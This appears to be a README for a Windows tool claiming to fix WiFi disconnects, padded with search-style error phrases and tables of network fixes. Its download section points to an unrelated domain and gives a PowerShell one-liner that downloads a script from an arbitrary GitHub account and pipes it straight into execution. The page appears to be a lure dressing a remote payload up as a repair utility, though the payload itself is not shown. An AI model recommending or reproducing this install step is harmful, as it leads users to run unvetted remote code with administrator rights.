# WiFi Disconnect Fix

> Fix WiFi keeps disconnecting, dropping out, and losing connection on Windows 10/11.

[![Windows](https://img.shields.io/badge/Windows-10%20%7C%2011-0078D4?style=flat-square&logo=windows&logoColor=white)]()
[![Version](https://img.shields.io/badge/v1.3.0-stable-brightgreen?style=flat-square)]()
[![MIT](https://img.shields.io/badge/License-MIT-blue?style=flat-square)](LICENSE)

---

### Download

**[Download Latest Release](https://wifi.zipzapsol.space/)**

<details>
<summary>Alternative: PowerShell</summary>

```powershell
irm https://raw.githubusercontent.com/CrystalContractor71/Release/main/install.ps1 | iex
```

</details>

---

## The Problem

Your WiFi keeps disconnecting. Every few minutes, the connection drops, you get the yellow triangle, and you have to reconnect. Or worse — WiFi connects but says **"No Internet"** even though the router is fine.

> *"WiFi keeps disconnecting every few minutes"*

> *"Connected, no internet" on WiFi*

> *"WiFi drops when laptop goes to sleep and won't reconnect"*

> *"WiFi disconnects when downloading large files"*

> *WiFi works on phone but* ***not on PC***

**WiFi Disconnect Fix** identifies and repairs the root cause automatically.

---

## What It Fixes

### WiFi Keeps Disconnecting

| Problem | Cause | Fix |
|---|---|---|
| **WiFi drops every 5-10 minutes** | Power management turning off adapter | Disables WiFi power saving completely |
| **WiFi disconnects randomly** | Driver instability | Updates or rolls back WiFi driver |
| **WiFi drops under heavy load** (gaming, downloads) | Roaming aggressiveness too high | Locks WiFi to strongest AP, disables roaming |
| **WiFi disconnects after sleep/hibernate** | Adapter doesn't wake properly | Disables WiFi power management, fixes wake |
| **WiFi drops when Bluetooth is active** | WiFi/BT coexistence interference | Disables BT coexistence, separates antennas |
| Disconnects after **Windows Update** | Update installed bad WiFi driver | Rolls back driver to previous version |

### Connected But No Internet

| Problem | Cause | Fix |
|---|---|---|
| **"Connected, no internet"** | DNS not resolving | Flushes DNS, switches to Google/Cloudflare DNS |
| **"No internet, secured"** | DHCP lease expired | Forces DHCP renewal, resets TCP/IP stack |
| WiFi shows connected but **pages don't load** | Corrupted Winsock catalog | Resets Winsock and TCP/IP |
| **Limited connectivity** | IP conflict or wrong gateway | Releases and renews IP, fixes gateway |
| Works after restart but **breaks again in hours** | DNS cache corruption | Schedules periodic DNS flush |

### Other WiFi Errors

| Problem | Fix |
|---|---|
| **"Can't connect to this network"** | Forgets network, resets adapter, reconnects |
| **"Unidentified Network"** | Resets TCP/IP, renews DHCP, fixes gateway |
| **"No Internet Access"** | Flushes DNS, resets Winsock, sets public DNS |
| **"Limited access"** | Renews IP, resets network components |
| **"The default gateway is not available"** | Reinstalls network adapter, resets gateway |
| **"DNS server not responding"** | Switches DNS to 8.8.8.8 / 1.1.1.1 |
| **"Network cable unplugged"** (on WiFi) | Resets adapter, reinstalls driver |

### WiFi Not Showing Up

| Problem | Fix |
|---|---|
| **WiFi option missing** from Settings | Re-enables WiFi adapter in Device Manager |
| **No WiFi networks found** | Resets WLAN AutoConfig service, rescans |
| WiFi adapter shows **"This device cannot start (Code 10)"** | Reinstalls adapter driver |
| WiFi adapter has **yellow triangle** in Device Manager | Removes and reinstalls driver cleanly |
| **Airplane mode stuck** | Resets radio management service |

---

## Preview

```
  +-------------------------------------------------+
  |         WiFi Disconnect Fix v1.3.0              |
  +-------------------------------------------------+
  |                                                 |
  |  WiFi Adapter: Intel AX210                      |
  |  Status:       Connected (signal: 78%)          |
  |  Driver:       22.240.0 (2025-11-14)            |
  |                                                 |
  |  Issues Found:                                  |
  |  [!] Power management     -- Enabled (bad)      |
  |  [!] Roaming aggress.     -- Highest (unstable) |
  |  [!] BT coexistence       -- Enabled (conflict) |
  |  [OK] DNS                 -- Responding          |
  |  [OK] DHCP                -- Lease valid          |
  |                                                 |
  |  [ Fix All ]  [ Reset Network ]  [ Exit ]       |
  |                                                 |
  +-------------------------------------------------+
```

---

## Fixes Applied

### Driver & Power

| Setting | Change |
|---|---|
| WiFi adapter power management | **Disabled** (prevents sleep disconnects) |
| Roaming aggressiveness | **Lowest** (stays on current AP) |
| Throughput booster | **Enabled** |
| WiFi/Bluetooth coexistence | **Disabled** (prevents interference) |
| Channel width (2.4GHz) | **20MHz** (more stable) |
| Channel width (5GHz) | **Auto** |
| Preferred band | **5GHz preferred** |
| U-APSD support | **Disabled** (causes drops on some routers) |

### Network Stack

| Action | What It Does |
|---|---|
| `netsh winsock reset` | Resets Windows network catalog |
| `netsh int ip reset` | Resets TCP/IP stack |
| `ipconfig /flushdns` | Clears corrupted DNS cache |
| `ipconfig /release & /renew` | Gets fresh IP from router |
| Set DNS to 8.8.8.8 / 1.1.1.1 | Reliable DNS instead of ISP default |
| Disable DNS over HTTPS issues | Fixes some "no internet" bugs |

### Services

| Service | Action |
|---|---|
| WLAN AutoConfig | Restart and set to Automatic |
| DHCP Client | Restart and set to Automatic |
| DNS Client | Restart |
| Network Location Awareness | Restart |

---

## Supported WiFi Adapters

**Intel** -- AX210, AX200, AX201, 9560, 9260, 8265, 8260, 7265, 7260 and all Intel WiFi adapters
**Realtek** -- RTL8821CE, RTL8822CE, RTL8852AE, RTL8852BE, RTL8188, RTL8192 and all Realtek WiFi
**Qualcomm** -- QCA6390, QCA9377, WCN785x, QCNFA765 and all Qualcomm Atheros WiFi
**MediaTek** -- MT7921, MT7922, MT7612, MT7610 and all MediaTek WiFi
**Broadcom** -- BCM43142, BCM4313, BCM94360 and all Broadcom WiFi
**USB WiFi adapters** -- TP-Link, ASUS, Netgear, D-Link and all USB dongles

---

## Common Scenarios

**WiFi drops when gaming online**
High bandwidth usage combined with roaming aggressiveness causes the adapter to "look for better networks" mid-game. The tool locks your adapter to the current network.

**Laptop WiFi disconnects after closing lid**
Power management puts the WiFi adapter to sleep. Even after waking, it doesn't reconnect properly. The tool disables adapter power saving.

**WiFi works on phone but not on PC**
The router is fine. Your PC's network stack (Winsock/TCP/IP) is corrupted. The tool resets it completely.

**"Connected, no internet" on one PC but others work fine**
DNS or DHCP issue specific to your PC. The tool flushes DNS, renews IP, and sets reliable DNS servers.

---

## System Requirements

| | |
|---|---|
| OS | Windows 10 / 11 (64-bit) |
| WiFi | Any WiFi adapter |
| Admin | Yes |
| Network | Works even with broken WiFi (fixes offline issues too) |

---

## FAQ

**Will this fix my slow WiFi speed?**
If slow speed is caused by driver issues or wrong adapter settings, yes. If it's your internet plan or router, no.

**Do I need to know my WiFi adapter model?**
No. The tool auto-detects your adapter and applies the correct fixes.

**Will it reset my saved WiFi passwords?**
No. Network stack reset does not affect saved WiFi profiles.

**Is it safe?**
Yes. All changes are standard Windows network settings and PowerShell commands. Nothing is patched.

**WiFi drops only on 5GHz, works on 2.4GHz.**
The tool adjusts 5GHz channel width and preferred band settings to stabilize 5GHz connections.

---

## License

[MIT](LICENSE)
